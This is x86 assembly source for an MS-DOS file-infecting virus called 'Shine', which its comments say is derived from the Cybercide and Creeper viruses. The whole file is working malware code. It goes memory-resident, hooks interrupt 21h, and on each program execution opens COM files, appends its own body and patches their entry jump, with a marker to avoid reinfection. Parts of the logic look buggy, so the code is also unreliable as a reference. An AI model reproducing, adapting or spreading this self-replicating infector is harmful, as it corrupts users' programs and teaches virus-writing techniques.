;---------------
; The shine DOS virus
; Based on the Cybercide DOS virus
; And the Creeper virus, no not the "catch me if you can" one, the MS-DOS one
; Here's the link: https://github.com/guitmz/virii/blob/master/c/CYBRCIDE.ASM, whew, that was a mouthfull 
; And hers to creeper: https://github.com/guitmz/virii/blob/master/c/CREEPER.ASM

org 0h

beninging:

call near get_delta   ; To calculate delta offset
get_delta:
     pop bp           ; BP = Delta+3
     sub bp, 3        ; To get to the True start of the virus
     mov word [data_section.delta_off+bp], bp
     mov word [new_int21.int21delta+bp], bp

     push bp          ; Save BP

     mov ax, 9a8ah    ; Are we in memory yet?
     int 21h          ; Call to int 21h
     cmp ax, 8b7bh    ; Is AX 8b7b?
     je short dont_install

     ;jmp install
alloc_mem:            ; We are in fact not in memory, lets relocate us away from here
     pop bp
     push bp          ; Save BP, again
     mov ax, 4800h    ; Function 48h Allocate Memory Blocks
     mov bx, 20h      ; Allocate 32 paragraphs, 512 bytes
     int 21h          ; Calling DOS
     mov dx, ax       ; DX => AX
     sub ax, 16       ; AX now points to the MCB
     mov es, ax       ; AX => ES
     pop bp           ; Restore BP
     push dx
     
     mov ax, 5500h    ; Create New PSP (Undocumented..... ooooo, spooky)
     mov si, 15h      ; Top of Memory
     int 21h          ; Call DOS
     pop dx           ; DX = Segment address of PSP
     push bp          ; Save BP
     mov bp, 1        ; BP = 1, MCB offset 1 = PSP owner segment address
     mov word [es:bp], dx ; Updating the PSP segment address to point to our own PSP
     
relocate:             ; Updated
     pop bp          ; Restore BP
     mov si, [data_section.delta_off+bp]  ; SI = Beginning of the virus
     mov di, es        ; DI = ES
     mov cx, endinging-beninging  ; CX = Virus size
     rep movsb        ; Copy the virus to the new segment

     mov word [jmp_seg+bp], es  ; Update the jump segment to point to the new segment
     mov ax, install  ; AX = Offset to the install code
     add ax, bp
     mov word [jmp_off+bp], ax  ; Update the jump offset to point to the new segment

     db 0EAh
     jmp_seg db 00h, 00h   ; Jump far, absolute, address given in operand 
     jmp_off db 00h, 00h   ; Jump far, absolute, address given in operand

     
     


install:
     push cs
     pop ds           ; DS = CS
     mov ax, 3521h    ; Get vector 21h
     int 21h          ; call int 21h
     mov word [goto_int21+bp+1], bx  ; Save Int 21h offset
     mov word [goto_int21+bp+3], es  ; And segment
     push bp
     add bp, new_int21
     mov ax, 2521h         ; Set vector 21h
     mov dx, bp            ; DS:DX = BP = BP+new_int21
     pop bp
     int 21h
     mov ax, 3100h         ; Terminate and Stay resident
     int 21h


dont_install:
     pop bp
     add bp, data_section.start_of_host
     mov si, bp
     mov di, 100h
     mov cx, 3
     rep movsb
     jmp 100h

;----------------
; This is the INT 21H HANDLER that will replace int 21h     


new_int21:
     pusha
     push bp
     push ax
     call near .past_bp
.int21delta dw 0
.past_bp: 
     pop bp
     sub bp, 2
     mov word ax, [cs:bp]
     mov bp, ax             ; BP = file delta offset
     pop ax
.what_func:
     cmp ax, 9a8ah        ; Loaded?
     je short send_msg          ; Report that we are in memory
     cmp ax, 4b00h        ; Load and Execute (Exec), function 0
     je short infect            ; On entry: DS:DX = ASCIIZ filename pointer
.restore_state:
     pop bp
     popa
.call_int21:
     jmp short goto_int21



goto_int21: db 0EAh, 00h, 00h, 00h, 00h   ; Jump far, absolute, address given in operand

send_msg:
     mov ax, 8b7bh    ; In Mem Signature
     pop bp
     popa
     iret

infect:               ; DS:DX = ASCIIZ Filename pointer
     mov ax, 3d40h    ; 3dh->FileOpen, 40h->01000000b: read-write
     int 21h          ; Open file Using Handle, Read Write. OUT: AX = Handle
     mov bx, ax       ; BX = File Handle
     push bx          ; Save BX
     xor cx, cx       ; CX = 0
     xor dx, dx       ; low order and high order = 0
     mov ax, 4200h    ; Move file pointer to begining of file
     int 21h          ; Call DOS
     pop bx           ; Restore BX
     push bx          ; BX = File Handle, save it again
     mov ax, 3f00h    ; Read file or device
     mov cx, 2        ; Read 2 bytes, this case from the start to check wheter it's a COM file or an MZ Executable
     push bp          ; Save BP
     add bp, data_section.MZ_BUF
     mov dx, bp       ; Pointer to the MZ buffer
     pop bp           ; Restore BP
     int 21h          ; Calling int 21h
     pop bx           ; Restore BX too
     cmp word [data_section.MZ_BUF+bp], 'MZ'  ; Is it a MZ EXE file?
     je short .abort_infection ; Yes, abort the infection attempt
     push bx          ; Save BX

                      ; Since we have now determined that the program in question is not an EXE file, but a COM file instead, we will infect it
     mov ax, 4202h    ; Function 42h (Move File Pointer), sub-function 02h (Signed offset from end of file)
     pop bx
     push bx          ; BX = File Handle
     xor cx, cx       ; CX = 0
     mov dx, 5        ; DX = 5
     int 21h          ; Calling int 21h
     pop bx
     cmp ax, 65436-virus_size   ; Is the file too big??
     jae short .abort_infection
     mov [data_section.host_size+bp], ax
     push bx          ; Nope, perfetto sizo. BX = File handle


     mov ax, 3f00h    ; Read file or device
     mov cx, 5        ; Read 5 bytes, this case from the start to check wheter it's already infected, since we dont wanna have repeated infections
     push bp          ; Save BP
     add bp, data_section.shine_buf ; 
     mov dx, bp       ; Pointer to the "Shine" buffer
     pop bp
     int 21h          ; Calling int 21h
     pop bx

     push bp
     add bp, data_section.shine_buf
     mov si, bp       ; Pointer to the "Shine" buffer
     pop bp
     push bp
     mov di, si
     add di, 5
     mov cx, 5
     rep cmpsb       ; Is EOF = 'Shine'?
     jz .abort_infection  ; Yes, abort infection
     push bx         ; Nope, let's infect this bad boy             

     ; We need to append the virus to the end of the program 
     mov ax, 4202h    ; Function 42h (Move File Pointer), sub-function 02h (Signed offset from end of file)
     pop bx
     push bx          ; BX = File Handle
     xor cx, cx       ; CX = 0
     mov dx, 0        ; DX = 0
     int 21h          ; Calling int 21h
     pop bx  
     pop bp

     push bx
     push bp
     mov ax, 4000h     ; Function 40h (Write file or device)
     mov cx, virus_size
     push ds
     push cs
     pop ds
     mov dx, bp
     int 21h
     pop ds
     pop bp
     pop bx

     push bp
     mov ax, 4200h    ; Function 42h (Move File Pointer), sub-function 02h (Absolute offset from start of file)
     push bx          ; BX = File Handle
     xor cx, cx       ; CX = 0
     mov dx, 0        ; DX = 0
     int 21h          ; Calling int 21h
     pop bx
     pop bp

     mov ax, 3f00h    ; Read file or device
     mov cx, 3        ; Read 3 bytes, this case from the start
     push bx
     push bp          ; Save BP
     add bp, data_section.start_of_host ; 
     mov dx, bp       ; Pointer to the "start buffer"
     int 21h          ; Calling int 21h
     pop bp
     pop bx
     
     push bp
     mov ax, 4200h    ; Function 42h (Move File Pointer), sub-function 02h (Absolute offset from start of file)
     push bx          ; BX = File Handle
     xor cx, cx       ; CX = 0
     xor dx, dx       ; DX = 0
     int 21h          ; Calling int 21h
     pop bx
     pop bp
     
     mov ax, 4000h
     push bx
     push bp
     add bp, data_section.jump_to_virus
     mov dx, bp
     mov cx, 3
     int 21h
     pop bp
     pop bx



.abort_infection:
     pop bp
     popa
     jmp short new_int21.call_int21




data_section:
     .start_of_host db 3
     .delta_off dw 0
     .jump_to_virus db 0E9h
     .host_size dw 0
     .MZ_BUF dw 0
     .shine_buf db '     '
     .file_infected db 'Shine'

virus_size equ endinging-beninging
endinging:
